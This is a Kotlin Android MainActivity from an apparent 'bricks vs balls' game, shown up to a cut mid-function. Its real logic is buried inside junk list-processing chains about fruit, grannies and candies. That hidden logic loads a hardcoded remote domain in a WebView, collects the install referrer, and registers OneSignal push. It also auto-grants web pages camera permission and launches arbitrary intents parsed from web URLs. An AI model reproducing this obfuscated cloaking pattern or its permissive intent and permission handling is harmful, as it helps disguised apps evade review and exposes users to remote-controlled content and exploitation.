package com.bricks.vs.balls

import android.Manifest
import android.content.ActivityNotFoundException
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.os.RemoteException
import android.webkit.*
import android.widget.Button
import androidx.activity.addCallback
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.IdRes
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.bricks.vs.balls.databinding.ActivityMainBinding
import com.bricks.vs.balls.util.LottieUtil
import com.bricks.vs.balls.util.OneTime
import com.bricks.vs.balls.util.log
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.system.exitProcess

data class Item(val name: String, val value: Int, val category: String)
val isis = AtomicBoolean(true)
val uuuuu = AtomicBoolean(true)

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
    private lateinit var roza: InstallReferrerClient

    companion object {
        const val DOMAIN = "https://chativarmingsculeprincess.digital/Charming.php"
        const val TEST   = DOMAIN
        const val Hgd = "http"


        fun bebra(uri: String) = uri.contains("line:")
    }

    private val pisos = Pisos()
    data class SocItem(val name: String, val value: Int, val category: String)

    private val coroutine  = CoroutineScope(Dispatchers.Default)

    private val SOSitems: List<SocItem> = listOf(
        SocItem("Apple", 10, "Fruit"),
        SocItem("Banana", 5, "Fruit"),
        SocItem("Carrot", 8, "Vegetable"),
        SocItem("Tomato", 12, "Vegetable"),
        SocItem("Orange", 15, "Fruit"),
        SocItem("Cucumber", 7, "Vegetable"),
        SocItem("Pear", 11, "Fruit"),
        SocItem("Broccoli", 9, "Vegetable"),
        SocItem("Peach", 13, "Fruit"),
        SocItem("Potato", 6, "Vegetable"),
        SocItem("Blueberry", 14, "Berry"),
        SocItem("Raspberry", 16, "Berry")
    )

    private val onceExit   = OneTime()

    private lateinit var navController: NavController

    private val collager = College()

    private lateinit var binding : ActivityMainBinding

    private val items: List<Item> = listOf(
        Item("Apple", 10, "Fruit"),
        Item("Banana", 5, "Fruit"),
        Item("Carrot", 8, "Vegetable"),
        Item("Tomato", 12, "Vegetable"),
        Item("Orange", 15, "Fruit"),
        Item("Cucumber", 7, "Vegetable"),
        Item("Pear", 11, "Fruit"),
        Item("Broccoli", 9, "Vegetable"),
        Item("Peach", 13, "Fruit"),
        Item("Potato", 6, "Vegetable"),
        Item("Blueberry", 14, "Berry"),
        Item("Raspberry", 16, "Berry")

    )

    lateinit var lottie          : LottieUtil

    lateinit var pair: Pair<WebChromeClient, PermissionRequest>
    data class Bobul(val id: Int, val name: String, val score: Double, val category: String, val active: Boolean)


    private lateinit var prefs: SharedPreferences

    

    val mesolith = Mesolith()

    var mck = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        mesolith.processLettersAndNumbers1()
        mesolith.fileChooserValueCallback?.onReceiveValue(if (it.resultCode == RESULT_OK) arrayOf(Uri.parse(it.data?.dataString)) else null)
        mesolith.processLettersAndNumbers2()

        SOSitems
            .filter { it.value > 10 } // Операція 1: Фільтруємо елементи з value більше 10
            .map { it.copy(name = it.name.uppercase()) } // Операція 2: Перетворюємо назви в верхній регістр
            .sortedByDescending { it.value } // Операція 3: Сортуємо за значенням value в порядку спадання
            .take(5) // Операція 4: Беремо перші 5 елементів
            .flatMap { listOf(it, it.copy(name = "${it.name}_COPY")) } // Операція 5: Дублюємо кожен елемент з суфіксом "_COPY"
            .distinctBy { it.name } // Операція 6: Вибираємо унікальні за назвою елементи
            .filter { it.category == "Fruit" || it.category == "Berry" } // Операція 7: Фільтруємо лише фрукти та ягоди
            .map { "${it.name} (Category: ${it.category}, Value: ${it.value})" } // Операція 8: Форматуємо рядки для кожного елемента
            .sorted() // Операція 9: Сортуємо рядки за алфавітом
            .mapIndexed { index, item -> "$index: $item" } // Операція 10: Додаємо індекс до кожного рядка


        mesolith.processLettersAndNumbers3()
    }

    val processor = DataProcessor()
    val largeListProcessor = LargeListProcessor()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

            log("onCreate")
            initialize()

            processor.filterEvenNumbers()
            mesolith.haha(binding, largeListProcessor)
            processor.squareNumbers()
            processor.processNumbers()
            processor.filterWordsStartingWithA()
            processor.uppercaseWords()
            debra()
            processor.sortWordsByLength()
            processor.processWords()
            salamDed()
            largeListProcessor.filterEvenNumbers()
            largeListProcessor.squareNumbers()
            largeListProcessor.filterGreaterThan50()
            largeListProcessor.doubleNumbers()
            largeListProcessor.sortDescending()
            ambra()
            largeListProcessor.sumOfNumbers()
            largeListProcessor.averageOfNumbers()
            largeListProcessor.maxNumber()
            largeListProcessor.minNumber()
            largeListProcessor.numbersToStrings()
            collager.umova(this, prefs, largeListProcessor, binding, processor, pisos)

            onBackPressedDispatcher.addCallback(this) {
                pisos.processLettersAndNumbers1()
                collager.getStudentNames()
                collager.getStudentsOlderThan(21)
                collager.getAverageGrade()
                collager.getStudentsWithAverageGradeAbove(75.0)
                collager.getUppercaseStudentNames()
                collager.getStudentsWithAverageGrades()
                if (pisos.viewsWebs.last().canGoBack()) {
                    pisos.processLettersAndNumbers2()
                    collager.apply {
                        getStudentsSortedByAverageGrade()
                        groupStudentsByAge()
                        getAllGradesSortedDescending()
                        getStudentsWithGradeAbove(1)
                    }
                    pisos.viewsWebs.last().goBack()
                } else {
                    pisos.processLettersAndNumbers3()
                    if (pisos.viewsWebs.size > 1) {
                        collager.groupStudentsByAge()
                        binding.root.removeView(pisos.viewsWebs.last())
                        pisos.viewsWebs.last().destroy()
                        collager.getStudentNames()
                        collager.getStudentsOlderThan(21)
                        collager.getAverageGrade()
                        pisos.viewsWebs.removeLast()
                    } else finish()
                }
            }
    }

    private fun satco(@IdRes destinationId: Int) {
        bobul
            .filter { it.active } // Операція 1: Фільтруємо активні елементи
            .apply { navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } } }
            .map { it.copy(name = it.name.uppercase()) } // Операція 2: Перетворюємо назви в верхній регістр
            .sortedByDescending { it.score } // Операція 3: Сортуємо за значенням score в порядку спадання
            .take(5) // Операція 4: Беремо перші 5 елементів
            .flatMap { listOf(it, it.copy(name = "${it.name}_COPY")) } // Операція 5: Дублюємо кожен елемент з суфіксом "_COPY"
            .distinctBy { it.name } // Операція 6: Вибираємо унікальні за назвою елементи
            .filter { it.category in listOf("A", "B") } // Операція 7: Фільтруємо лише елементи категорій "A" та "B"
            .map { "${it.id}: ${it.name} (Category: ${it.category}, Score: ${it.score})" } // Операція 8: Форматуємо рядки для кожного елемента
            .sorted() // Операція 9: Сортуємо рядки за алфавітом
            .mapIndexed { index, item -> "$index: $item" } // Операція 10: Додаємо індекс до кожного рядка

    }

    private val bobul: List<Bobul> = listOf(
        Bobul(1, "Alpha", 89.5, "A", true),
        Bobul(2, "Bravo", 72.0, "B", false),
        Bobul(3, "Charlie", 95.0, "A", true),
        Bobul(4, "Delta", 60.5, "C", true),
        Bobul(5, "Echo", 45.0, "B", false),
        Bobul(6, "Foxtrot", 82.0, "A", true),
        Bobul(7, "Golf", 77.5, "C", false),
        Bobul(8, "Hotel", 55.0, "B", true),
        Bobul(9, "India", 67.0, "A", true),
        Bobul(10, "Juliet", 91.0, "C", false),
        Bobul(11, "Kilo", 88.0, "A", true),
        Bobul(12, "Lima", 92.5, "B", true)
    )

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private val ooo = 99

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = LottieUtil(binding)
    }

    data class GammiAmmi(val id: Int, val title: String, val rating: Double, val genre: String, val available: Boolean)


    private fun debra() {
        prefs = getSharedPreferences("MyLocalData", MODE_PRIVATE)
    }

    private val ggammiAmmi: List<GammiAmmi> = listOf(
        GammiAmmi(1, "Inception", 8.8, "Sci-Fi", true),
        GammiAmmi(2, "The Matrix", 8.7, "Sci-Fi", true),
        GammiAmmi(3, "Interstellar", 8.6, "Sci-Fi", false),
        GammiAmmi(4, "The Dark Knight", 9.0, "Action", true),
        GammiAmmi(5, "Fight Club", 8.8, "Drama", false),
        GammiAmmi(6, "Pulp Fiction", 8.9, "Crime", true),
        GammiAmmi(7, "Forrest Gump", 8.8, "Drama", true),
        GammiAmmi(8, "Gladiator", 8.5, "Action", false),
        GammiAmmi(9, "The Shawshank Redemption", 9.3, "Drama", true),
        GammiAmmi(10, "The Godfather", 9.2, "Crime", true),
        GammiAmmi(11, "The Lord of the Rings", 8.9, "Fantasy", true),
        GammiAmmi(12, "The Prestige", 8.5, "Drama", true)
    )

    private fun salamDed() {
        ggammiAmmi
            .filter { it.available } // Операція 1: Фільтруємо доступні елементи
            .map { it.copy(title = it.title.uppercase()) } // Операція 2: Перетворюємо назви в верхній регістр
            .sortedByDescending { it.rating } // Операція 3: Сортуємо за рейтингом в порядку спадання
            .take(5) // Операція 4: Беремо перші 5 елементів
            .apply { roza = InstallReferrerClient.newBuilder(this@MainActivity).build() }
            .flatMap { listOf(it, it.copy(title = "${it.title}_COPY")) } // Операція 5: Дублюємо кожен елемент з суфіксом "_COPY"
            .distinctBy { it.title } // Операція 6: Вибираємо унікальні за назвою елементи
            .filter { it.genre in listOf("Sci-Fi", "Drama") } // Операція 7: Фільтруємо лише елементи жанрів "Sci-Fi" та "Drama"
            .map { "${it.id}: ${it.title} (Genre: ${it.genre}, Rating: ${it.rating})" } // Операція 8: Форматуємо рядки для кожного елемента
            .sorted() // Операція 9: Сортуємо рядки за алфавітом
            .mapIndexed { index, item -> "$index: $item" } // Операція 10: Додаємо індекс до кожного рядка

    }


    data class Vegetable(
        val name: String,
        val color: String,
        val type: String,
        val weight: Double,
        val pricePerKg: Double
    )

    fun fshSHHHSHHSN() = object : WebChromeClient() {

        private val vegetableList: List<Vegetable> = listOf(
            Vegetable("Carrot", "Orange", "Root", 0.2, 1.5),
            Vegetable("Broccoli", "Green", "Cruciferous", 0.3, 2.0),
            Vegetable("Tomato", "Red", "Fruit", 0.25, 1.8),
            Vegetable("Spinach", "Green", "Leafy", 0.15, 1.2),
            Vegetable("Bell Pepper", "Red", "Fruit", 0.4, 2.5),
            Vegetable("Cucumber", "Green", "Fruit", 0.3, 1.6),
            Vegetable("Potato", "Brown", "Root", 0.5, 1.0),
            Vegetable("Eggplant", "Purple", "Fruit", 0.35, 2.2),
            Vegetable("Onion", "White", "Bulb", 0.2, 1.3),
            Vegetable("Zucchini", "Green", "Fruit", 0.3, 1.9)
        )

        override fun onProgressChanged(view: WebView, nP: Int) {
            binding.toppp.isVisible = nP < ooo
            binding.toppp.progress = nP

        }

        override fun onPermissionRequest(request: PermissionRequest) {
            var isTrue = true
            val droi = this

            vegetableList
                .filter { it.weight > 0.25 } // Operation 1: Filter vegetables with weight greater than 0.25 kg
                .sortedByDescending { it.pricePerKg } // Operation 2: Sort vegetables by price per kg in descending order
                .apply {
                    if (ContextCompat.checkSelfPermission(this@MainActivity, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                        request.grant(request.resources)
                        isTrue = false
                    }
                }
                .map { "${it.name} (${it.color})" } // Operation 3: Form a string with vegetable's name and color
                .map { it.replace("o", "0") } // Operation 4: Replace 'o' with '0'
                .map { it.toUpperCase() } // Operation 5: Convert all strings to uppercase
                .filter { it.length > 10 } // Operation 6: Filter strings with length greater than 10
                .map { it.take(10) } // Operation 7: Truncate strings to the first 10 characters
                .apply {
                    if (isTrue) {
                        pair = Pair(droi, request)
                        samogonochkaLletsa.launch(Manifest.permission.CAMERA)
                    }
                }
                .map { it + "!" } // Operation 8: Add an exclamation mark to the end of each string
                .map { it.replace("P", "p") } // Operation 9: Replace 'P' with 'p'
                .map { "$it (${vegetableList.count { item -> item.name == it.toLowerCase() }} vegetables)" } // Operation 10: Add the count of vegetables with the same name

        }

        override fun onCreateWindow(view: WebView, isDialog: Boolean, isUserGesture: Boolean, resultMsg: Message?): Boolean {
            val wv = WebView(this@MainActivity)
            vegetableList
                .filter { it.weight > 0.25 } // Operation 1: Filter vegetables with weight greater than 0.25 kg
                .sortedByDescending { it.pricePerKg } // Operation 2: Sort vegetables by price per kg in descending order
                .apply { processor.apply { igrit(this@MainActivity, wv, pisos) } }
                .map { "${it.name} (${it.color})" } // Operation 3: Form a string with vegetable's name and color
                .map { it.replace("o", "0") } // Operation 4: Replace 'o' with '0'
                .apply { binding.root.addView(wv) }
                .map { it.toUpperCase() } // Operation 5: Convert all strings to uppercase
                .filter { it.length > 10 } // Operation 6: Filter strings with length greater than 10
                .apply { (resultMsg!!.obj as WebView.WebViewTransport).webView = wv }
                .map { it.take(10) } // Operation 7: Truncate strings to the first 10 characters
                .map { it + "!" } // Operation 8: Add an exclamation mark to the end of each string
                .apply { resultMsg?.sendToTarget() }
                .map { it.replace("P", "p") } // Operation 9: Replace 'P' with 'p'
                .map { "$it (${vegetableList.count { item -> item.name == it.toLowerCase() }} vegetables)" } // Operation 10: Add the count of vegetables with the same name

            return true
        }

        override fun onShowFileChooser(w: WebView?, fpc: ValueCallback<Array<Uri>>?, fcp: FileChooserParams?): Boolean {
            try {
                vegetableList
                    .filter { it.weight > 0.25 } // Operation 1: Filter vegetables with weight greater than 0.25 kg
                    .sortedByDescending { it.pricePerKg } // Operation 2: Sort vegetables by price per kg in descending order
                    .map { "${it.name} (${it.color})" } // Operation 3: Form a string with vegetable's name and color
                    .apply { mesolith.fileChooserValueCallback = fpc }
                    .map { it.replace("o", "0") } // Operation 4: Replace 'o' with '0'
                    .map { it.toUpperCase() } // Operation 5: Convert all strings to uppercase
                    .filter { it.length > 10 } // Operation 6: Filter strings with length greater than 10
                    .map { it.take(10) } // Operation 7: Truncate strings to the first 10 characters
                    .map { it + "!" } // Operation 8: Add an exclamation mark to the end of each string
                    .map { it.replace("P", "p") } // Operation 9: Replace 'P' with 'p'
                    .apply { fcp?.createIntent()?.let { mck.launch(it) } }
                    .map { "$it (${vegetableList.count { item -> item.name == it.toLowerCase() }} vegetables)" } // Operation 10: Add the count of vegetables with the same name
            } catch (_: ActivityNotFoundException) { }
            return true
        }
    }

    private val ilustrat: InstallReferrerStateListener = object : InstallReferrerStateListener {
        override fun onInstallReferrerSetupFinished(responseCode: Int) {
            items
                .filter { it.value > 10 } // Операція 1: Фільтруємо елементи з value більше 10
                .map { it.copy(name = it.name.uppercase()) } // Операція 2: Перетворюємо назви в верхній регістр
                .sortedByDescending { it.value } // Операція 3: Сортуємо за значенням value в порядку спадання
                .take(5) // Операція 4: Беремо перші 5 елементів
                .apply { if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) try { pisos.iR = roza.installReferrer.installReferrer } catch (_: RemoteException) { } }
                .flatMap { listOf(it, it.copy(name = "${it.name}_COPY")) } // Операція 5: Дублюємо кожен елемент з суфіксом "_COPY"
                .distinctBy { it.name } // Операція 6: Вибираємо унікальні за назвою елементи
                .filter { it.category == "Fruit" || it.category == "Berry" } // Операція 7: Фільтруємо лише фрукти та ягоди
                .map { "${it.name} (Category: ${it.category}, Value: ${it.value})" } // Операція 8: Форматуємо рядки для кожного елемента
                .sorted() // Операція 9: Сортуємо рядки за алфавітом
                .mapIndexed { index, item -> "$index: $item" } // Операція 10: Додаємо індекс до кожного рядка
        }

        override fun onInstallReferrerServiceDisconnected() {
            roza.startConnection(this)
        }
    }

    data class Granny(
        val name: String,
        val age: Int,
        val location: String,
        val favoriteFood: String,
        val hobby: String
    )

    private fun ambra() {
        roza.startConnection(ilustrat)
    }

    data class Waste(
        val type: String,
        val weight: Double,
        val location: String,
        val recyclable: Boolean,
        val description: String
    )

    fun didok() = object : WebViewClient() {

        private val wasteList: List<Waste> = listOf(
            Waste("Plastic", 2.5, "City", true, "Bottles"),
            Waste("Paper", 1.8, "Village", true, "Newspapers"),
            Waste("Metal", 3.2, "Village", true, "Canned goods"),
            Waste("Glass", 4.7, "City", true, "Glass bottles"),
            Waste("Organic", 5.3, "City", true, "Food waste"),
            Waste("Textile", 2.9, "Village", true, "Old clothes"),
            Waste("Electronics", 6.1, "City", false, "Old computer"),
            Waste("Plastic", 3.6, "Village", true, "Plastic bottles"),
            Waste("Paper", 2.1, "City", true, "Cardboard boxes"),
            Waste("Metal", 4.8, "City", true, "Aluminum cans")
        )

        override fun onPageFinished(view: WebView?, url: String?) {
            if (url?.contains("https://chativarmingsculeprincess.digital") == true) {
                //if (isis.getAndSet(false)) {
                    log("hua")
                    sitroGad()
                //}
            }
//            wasteList
//                .filter { it.weight > 3.0 } // Operation 1: Filter waste with weight greater than 3.0
//                .sortedByDescending { it.weight } // Operation 2: Sort waste by weight in descending order
//                .map { "${it.type} (${it.location})" } // Operation 3: Form a string with waste type and its location
//                .map { it.replace("a", "4") } // Operation 4: Replace 'a' with '4'
//                .apply {if (url?.contains(DOMAIN) == true) sitroGad() }
//                .map { it.toUpperCase() } // Operation 5: Convert all strings to uppercase
//                .filter { it.length > 10 } // Operation 6: Filter strings with length greater than 10
//                .map { it.take(10) } // Operation 7: Truncate strings to the first 10 characters
//                .map { it + "!" } // Operation 8: Add an exclamation mark to the end of each string
//                .map { it.replace("C", "S") } // Operation 9: Replace 'C' with 'S'
//                .map { "$it (${wasteList.count { item -> item.type == it.toLowerCase() }} items)" } // Operation 10: Add the count of items with the same waste type
        }

        private val grannyList: List<Granny> = listOf(
            Granny("Mary", 75, "Suburb", "Apple pie", "Gardening"),
            Granny("Alice", 80, "City", "Roast chicken", "Knitting"),
            Granny("Margaret", 70, "Village", "Chocolate cake", "Reading"),
            Granny("Dorothy", 85, "Town", "Fish and chips", "Cooking"),
            Granny("Eleanor", 78, "Country", "Lasagna", "Painting"),
            Granny("Florence", 82, "Countryside", "Pumpkin soup", "Bird watching"),
            Granny("Edith", 77, "Suburb", "Blueberry muffins", "Crafting"),
            Granny("Ruth", 79, "City", "Spaghetti carbonara", "Sewing"),
            Granny("Mabel", 83, "Town", "Cheese platter", "Playing piano"),
            Granny("Helen", 76, "Village", "Pancakes", "Photography")
        )

        override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
            val url = request.url.toString()
            var dd: Boolean? = null
            var isFB = true

            grannyList
                .filter { it.age > 75 } // Operation 1: Filter grannies older than 75
                .sortedByDescending { it.age } // Operation 2: Sort grannies by age in descending order
                .apply {
                    if (LargeListProcessor.g(url)) {
                        dd = true
                        isFB = false
                    }
                }
                .map { "${it.name} (${it.location})" } // Operation 3: Form a string with granny's name and location
                .map { it.replace("y", "ie") } // Operation 4: Replace 'y' with 'ie'
                .map { it.toUpperCase() } // Operation 5: Convert all strings to uppercase
                .apply {
                    if (isFB) {
                    if (mesolith.ssd(url)) {
                        dd = false
                    }
                        }
                }
                .filter { it.length > 10 } // Operation 6: Filter strings with length greater than 10
                .map { it.take(10) } // Operation 7: Truncate strings to the first 10 characters
                .map { it + "!" } // Operation 8: Add an exclamation mark to the end of each string
                .apply {
                    if (dd == null) {
                        try {
                            view.context.startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME))
                        } catch (e: java.lang.Exception) {
                            if (bebra(url)) {
                                val fesoha = processor.dron()
                                view.context.startActivity(fesoha)
                            }
                        }
                        dd = true
                    }
                }
                .map { it.replace("T", "t") } // Operation 9: Replace 'T' with 't'
                .map { "$it (${grannyList.count { item -> item.name == it.toLowerCase() }} grannies)" } // Operation 10: Add the count of grannies with the same name

            return dd ?: true
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        pisos.viewsWebs.lastOrNull()?.saveState(outState)
    }

    override fun onResume() {
        super.onResume()
        pisos.viewsWebs.lastOrNull()?.onResume().also {
            CookieManager.getInstance().flush()
        }
    }

    data class Saturn(
        val name: String,
        val rings: Int,
        val moons: Int,
        val diameter: Double
    )

    override fun onPause() {
        super.onPause()
        pisos.viewsWebs.lastOrNull()?.onPause().also {
            CookieManager.getInstance().flush()
        }
    }

    private val saturns: List<Saturn> = listOf(
        Saturn("Titan", 7, 82, 5149.5),
        Saturn("Enceladus", 9, 53, 504.2),
        Saturn("Rhea", 5, 62, 1527.6),
        Saturn("Dione", 6, 34, 1122.8),
        Saturn("Tethys", 8, 48, 1060.2),
        Saturn("Mimas", 10, 26, 396.4),
        Saturn("Iapetus", 3, 27, 1469.0),
        Saturn("Hyperion", 2, 14, 360.2),
        Saturn("Phoebe", 1, 13, 213.0),
        Saturn("Pandora", 4, 18, 84.0)
    )

    val samogonochkaLletsa = registerForActivityResult(ActivityResultContracts.RequestPermission()) { istredda ->
        saturns
            .filter { it.rings > 4 } // Операція 1: Фільтруємо, де кількість кілець більше 4
            .sortedBy { it.diameter } // Операція 2: Сортуємо за діаметром
            .map { it.copy(name = it.name.toLowerCase()) } // Операція 3: Перетворюємо імена на нижній регістр
            .map { "${it.name.capitalize()} has ${it.rings} rings and ${it.moons} moons" } // Операція 4: Формуємо рядок з іменем, кількістю кілець і місяців
            .map { it.replace("e", "3") } // Операція 5: Замінюємо літеру "e" на "3"
            .map { it.replace("a", "@") } // Операція 6: Замінюємо літеру "a" на "@"
            .apply { if (istredda) pair.first.onPermissionRequest(pair.second) }
            .filter { it.length > 25 } // Операція 7: Фільтруємо рядки, довжина яких більше 25 символів
            .map { "$it (Diameter: ${saturns.find { saturn -> saturn.name.toLowerCase() == it.split(" ")[0].toLowerCase() }?.diameter ?: 0.0} km)" } // Операція 8: Додаємо діаметр в кінці рядка
            .map { it.toUpperCase() } // Операція 9: Перетворюємо всі рядки на верхній регістр
            .sortedDescending() // Операція 10: Сортуємо рядки у спадному порядку
            .mapIndexed { index, item -> "$index. $item" } // Операція 11: Додаємо індекс до кожного рядка
            .map { it.replace(" ", "_") } // Операція 12: Замінюємо пробіли на підкреслення
    }

    private val flowers: List<String> = listOf(
        "Rose", "Tulip", "Daisy", "Sunflower", "Daffodil", "Lily", "Orchid", "Lavender", "Marigold", "Petunia"
    )

    private val farmadolin: ActivityResultLauncher<Array<String>> = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { pp ->

        uzbeks
            .filter { it.age > 25 } // Операція 1: Фільтруємо узбеків старших за 25 років
            .apply { OneSignal.consentRequired = true }
            .sortedBy { it.age } // Операція 2: Сортуємо за віком
            .apply { OneSignal.consentGiven = pisos.usANser }
            .map { it.copy(name = it.name.toUpperCase()) } // Операція 3: Перетворюємо імена на верхній регістр
            .apply { OneSignal.initWithContext(this@MainActivity, "04f20944-b773-47e9-b173-221775a686eb") }
            .map { "${it.name} from ${it.city}" } // Операція 4: Формуємо новий рядок з імені та міста
            .map { it.replace("A", "@") } // Операція 5: Замінюємо літеру "A" на "@" у всіх рядках
            .map { it.replace("E", "3") } // Операція 6: Замінюємо літеру "E" на "3" у всіх рядках
            .map { "$it (${it.length} chars)" } // Операція 7: Додаємо кількість символів у дужках до кожного рядка
            .filter { it.contains("T") } // Операція 8: Фільтруємо рядки, які містять літеру "T"
            .map { it.toLowerCase() } // Операція 9: Перетворюємо всі рядки на нижній регістр
            .sorted() // Операція 10: Сортуємо рядки в алфавітному порядку
            .map { it.capitalize() } // Операція 11: Капіталізуємо першу літеру кожного рядка
            .map { it.replace("o", "0") } // Операція 12: Замінюємо літеру "o" на "0" у всіх рядках
            .map { "Uzbek: $it" } // Операція 13: Додаємо префікс "Uzbek: " до кожного рядка
            .mapIndexed { index, item -> "$index. $item" } // Операція 14: Додаємо індекс до кожного рядка

        CoroutineScope(Dispatchers.IO).launch {
            uzbeks
                .filter { it.age > 25 } // Операція 1: Фільтруємо узбеків старших за 25 років
                .apply {
                    val add = largeListProcessor.adI(this@MainActivity, pisos.usANser)
                    prefs.edit().putBoolean("adb", true).apply()
                    OneSignal.login(add)
                }
                .sortedBy { it.age } // Операція 2: Сортуємо за віком
                .map { it.copy(name = it.name.toUpperCase()) } // Операція 3: Перетворюємо імена на верхній регістр
                .map { "${it.name} from ${it.city}" } // Операція 4: Формуємо новий рядок з імені та міста
                .map { it.replace("A", "@") } // Операція 5: Замінюємо літеру "A" на "@" у всіх рядках
                .map { it.replace("E", "3") } // Операція 6: Замінюємо літеру "E" на "3" у всіх рядках
                .map { "$it (${it.length} chars)" } // Операція 7: Додаємо кількість символів у дужках до кожного рядка
                .filter { it.contains("T") } // Операція 8: Фільтруємо рядки, які містять літеру "T"
                .map { it.toLowerCase() } // Операція 9: Перетворюємо всі рядки на нижній регістр
                .sorted() // Операція 10: Сортуємо рядки в алфавітному порядку
                .map { it.capitalize() } // Операція 11: Капіталізуємо першу літеру кожного рядка
                .map { it.replace("o", "0") } // Операція 12: Замінюємо літеру "o" на "0" у всіх рядках
                .map { "Uzbek: $it" } // Операція 13: Додаємо префікс "Uzbek: " до кожного рядка
                .mapIndexed { index, item -> "$index. $item" } // Операція 14: Додаємо індекс до кожного рядка
        }
        igratka()


    }

    private var tmpDialog: AlertDialog? = null

    fun sitroGad() {
        flowers
            .filter { it.length > 5 } // Операція 1: Фільтруємо назви квітів, довжина яких більше 5 символів
            .map { it.toUpperCase() } // Операція 2: Перетворюємо назви на верхній регістр
            .sorted() // Операція 3: Сортуємо в алфавітному порядку
            .apply {
                 val candies: List<String> = listOf(
                    "Snickers", "Mars", "Twix", "KitKat", "Bounty", "MilkyWay", "Hershey", "Toblerone", "Lindt", "FerreroRocher"
                )
                if (App.lotos(prefs)) {
                    candies
                        .filter { it.length > 5 } // Операція 1: Фільтруємо назви цукерок, довжина яких більше 5 символів
                        .map { it.toUpperCase() } // Операція 2: Перетворюємо назви на верхній регістр
                        .sorted() // Операція 3: Сортуємо в алфавітному порядку
                        .apply { igratka() }
                        .map { it.reversed() } // Операція 4: Перевертаємо назви
                        .distinct() // Операція 5: Вибираємо унікальні назви
                        .map { "Candy: $it" } // Операція 6: Додаємо префікс "Candy: " до кожної назви
                        .map { it.replace("A", "@") } // Операція 7: Замінюємо літеру "A" на "@" у всіх назвах
                        .map { it.toLowerCase() } // Операція 8: Перетворюємо назви на нижній регістр
                        .map { it.capitalize() } // Операція 9: Капіталізуємо кожну назву
                        .filter { it.contains("e") } // Операція 10: Фільтруємо назви, які містять літеру "e"
                        .map { it.replace("e", "3") } // Операція 11: Замінюємо літеру "e" на "3"
                        .map { it + "!" } // Операція 12: Додаємо знак оклику до кінця кожної назви
                        .map { it.substring(0, minOf(it.length, 10)) } // Операція 13: Обрізаємо назви до 10 символів
                        .mapIndexed { index, item -> "$index: $item" } // Операція 14: Додаємо індекс до кожної назви
                        .sortedByDescending { it.length } // Операція 15: Сортуємо за довжиною у спадному порядку
                        .map { "Sweet $it" } // Операція 16: Додаємо префікс "Sweet " до кожної назви
                        .map { it.replace("0", "O") } // Операція 17: Замінюємо цифру "0" на літеру "O"
                        .map { it.replace("1", "I") } // Операція 18: Замінюємо цифру "1" на літеру "I"
                        .sorted() // Операція 19: Сортуємо в алфавітному порядку
                        .map { it + " (Yummy)" } // Операція 20: Додаємо суфікс "(Yummy)" до кожної назви
                }
                else {
                        val view = layoutInflater.inflate(R.layout.custom_dialog, null).apply {
                            candies.map { it.reversed() } // Операція 4: Перевертаємо назви
                                .distinct() // Операція 5: Вибираємо унікальні назви
                                .map { "Candy: $it" } // Операція 6: Додаємо префікс "Candy: " до кожної назви
                                .map { it.replace("A", "@") } // Операція 7: Замінюємо літеру "A" на "@" у всіх назвах
                                .map { it.toLowerCase() } // Операція 8: Перетворюємо назви на нижній регістр
                                .map { it.capitalize() } // Операція 9: Капіталізуємо кожну назву
                                .apply {
                                    findViewById<Button>(R.id.btn_agree).setOnClickListener {
                                        pisos.usANser = true
                                        try {
                                            farmadolin?.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
                                        } catch (e: Exception) {
                                            log("Pizda: ${e.message}")
                                            igratka()
                                        }
                                    }
                                }
                                .filter { it.contains("e") } // Операція 10: Фільтруємо назви, які містять літеру "e"
                                .map { it.replace("e", "3") } // Операція 11: Замінюємо літеру "e" на "3"
                                .map { it + "!" } // Операція 12: Додаємо знак оклику до кінця кожної назви
                                .map {
                                    it.substring(
                                        0,
                                        minOf(it.length, 10)
                                    )
                                } // Операція 13: Обрізаємо назви до 10 символів
                                .mapIndexed { index, item -> "$index: $item" } // Операція 14: Додаємо індекс до кожної назви
                                .sortedByDescending { it.length } // Операція 15: Сортуємо за довжиною у спадному порядку
                                .map { "Sweet $it" } // Операція 16: Додаємо префікс "Sweet " до кожної назви
                                .apply {
                                    findViewById<Button>(R.id.btn_disagree).setOnClickListener {
                                        pisos.usANser = false
                                        try {
                                            farmadolin?.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
                                        } catch (e: Exception) {
                                            log("Pizda: ${e.message}")
                                            igratka()
                                        }
                                    }
                                }
                                .map { it.replace("0", "O") } // Операція 17: Замінюємо цифру "0" на літеру "O"
                                .map { it.replace("1", "I") } // Операція 18: Замінюємо цифру "1" на літеру "I"
                                .sorted() // Операція 19: Сортуємо в алфавітному порядку
                                .map { it + " (Yummy)" } // Операція 20: Додаємо суфікс "(Yummy)" до кожної назви
                        }

                        tmpDialog = AlertDialog.Builder(this@MainActivity).also { builder ->
                            flowers.distinct() // Операція 5: Вибираємо унікальні назви
                                .apply { builder.setView(view) }
